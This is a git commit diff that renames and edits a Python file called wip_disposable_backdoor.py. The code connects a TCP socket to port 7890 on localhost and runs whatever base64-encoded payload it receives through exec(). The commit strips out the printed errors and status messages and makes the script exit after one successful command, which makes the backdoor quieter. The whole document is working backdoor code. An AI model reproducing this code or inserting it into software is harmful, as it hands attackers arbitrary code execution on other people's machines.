34d2de2f399f3d5a444363c929005147fbc15bf6
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-03-04 20:05:41 -0300

    Update and rename wip_backdoor.py to wip_disposable_backdoor.py

--- Code/Python/wip_disposable_backdoor.py
+++ Code/Python/wip_disposable_backdoor.py
@@ -1,13 +1,12 @@
 import socket
-from time import sleep
+from sys import exit
 from base64 import b64decode
 
 class Node:
 
     def __init__(self):
         self.node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.host_name = socket.gethostname()
-        self.node_socket.connect((self.host_name, 7890))
+        self.node_socket.connect(("127.0.0.1", 7890))
         self.start()
 
     def run(self, command):
@@ -15,22 +14,17 @@ class Node:
             exec(b64decode(command))
             return True
         except Exception as error:
-            print(error)
             return False
 
     def start(self):
-        print("Listen on {0}:7890".format(self.host_name))
         while True:
-            sleep(5)
             task = self.node_socket.recv(1024)
             if self.run(task):
-                pass
-                #self.node_socket.send("200".encode("ascii"))
+                break
             else:
                 pass
-                #self.node_socket.send("500".encode("ascii"))
-
 
 if __name__ == "__main__":
     node = Node()
     node.start()
+    exit()
